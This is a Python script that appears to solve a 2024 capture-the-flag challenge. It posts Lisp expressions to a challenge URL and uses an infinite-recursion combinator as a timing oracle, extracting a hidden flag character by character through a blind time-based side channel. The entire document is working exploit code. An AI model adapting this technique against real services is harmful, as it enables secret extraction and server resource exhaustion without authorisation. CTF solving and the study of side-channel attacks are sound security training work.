import requests
from time import time
import string

url = "https://thescenicroute.q.2024.ugractf.ru/a0a8rr1e7nanyh23"

charlist = list(string.ascii_lowercase)+list(map(str,
                                                 [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]))+["_"]+list(string.ascii_uppercase)


def generate_payload(i, timeout):
    print("Flag index = "+str(i))
    flag_char = "(car "
    if i == 0:
        flag_char += "flag)"
    else:
        flag_char += "(cdr "*i
        flag_char += "flag" + ")"*(i+1)
    for ch in charlist:
        ch_n = ord(ch)
        payload = f"(if (eq {ch_n} {flag_char}) ((lambda (x) (x x)) (lambda (x) (x x))) 0)"
        time_taken = send_code(payload)
        print(ch, time_taken)
        if time_taken > timeout:
            return ch
    else:
        return -1


def send_code(lisp):
    start = time()
    data = {'lisp': lisp}
    r = requests.post(url, data=data)
    end = time()
    return end-start


limit = 30
timeout = 2.5

flag = ""

for j in range(limit):
    found_ch = generate_payload(j, timeout)
    if found_ch == -1:
        break
    flag += found_ch
    print(flag)

print(flag)
